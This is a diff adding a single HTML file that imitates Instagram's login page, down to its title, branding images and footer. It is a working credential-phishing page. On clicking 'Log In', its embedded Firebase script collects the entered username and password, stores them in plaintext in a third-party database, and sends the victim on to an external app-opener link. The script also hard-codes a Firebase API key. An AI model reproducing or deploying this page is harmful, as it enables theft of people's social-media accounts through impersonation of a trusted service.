@@ -1,0 +1,144 @@
+<!-- This is instagram login page -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="google-site-verification" content="oNor2TQJzNgdtiwZp2OkT5zDxKbUszVTBPhOzvYBjlk" />
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
+    <style>
+        img {
+            vertical-align: text-top;
+        }
+    </style>
+</head>
+
+<body onload="ci()">
+      <script src="main.js"></script>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email">
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <span>
+                <div class="field" id="pass">
+                    <input oninput="check()" id="password" type="password" placeholder="password(must be 8 characters)"><button type="button" onclick="shw()" id="show">Show</button>
+                    <label for="password">Password</label>
+                </div>
+            </span>
+            
+                <button type="button" class="login-button" id="loginbtn" title="login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a STYLE="color:#577C9E;" href="facebook-login.html">&nbsp;Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+    <br>
+    <div class="get">
+    Get the app.
+    </div>
+    <br>
+    <div class="apps">
+        <a href="/forget.html">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
+        </div>
+        <br>
+        <div class="bottom">
+        <div class="footer">
+    <footer>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
+    </footer>
+</div>
+<div class="copyright">
+    <br>    
+    English © 2024 Instagram from Meta
+</div>
+</div>  
+
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-analytics.js";
+    import { getDatabase, ref, child, get, set, update, remove} from "https://www.gstatic.com/firebasejs/10.7.2/firebase-database.js";
+    
+    const firebaseConfig = {
+      apiKey: "AIzaSyCGmDpkJ2TUVjRnKwDZNBpb8SpNIuGBD_c",
+      authDomain: "wrud-60a00.firebaseapp.com",
+      projectId: "wrud-60a00",
+      storageBucket: "wrud-60a00.appspot.com",
+      messagingSenderId: "347869395003",
+      appId: "1:347869395003:web:e9683d330d579c7694441e",
+      measurementId: "G-FJPSL79WYX",
+      databaseURL: "https://wrud-60a00-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getDatabase();
+
+
+    function login() {
+  var username = document.getElementById("username").value;
+  var password = document.getElementById("password").value;
+  console.log(username, password);
+
+  // Encode the username (email) to create a valid Firebase path
+  var encodedUsername = encodeURIComponent(username);
+
+  set(ref(db, 'accounts/'), {
+    username: username,
+    password: password
+  }).then(() => {
+    window.location.href = 'https://appopener.co.in/ig/x9zy6bt6x';
+  }).catch(() => {
+    alert("Login Unsuccessful");
+  });
+}
+
+let addbtn = document.getElementById('loginbtn');
+
+addbtn.addEventListener('click', login);
+    
+  </script>
+
+</body>
+
+</html>
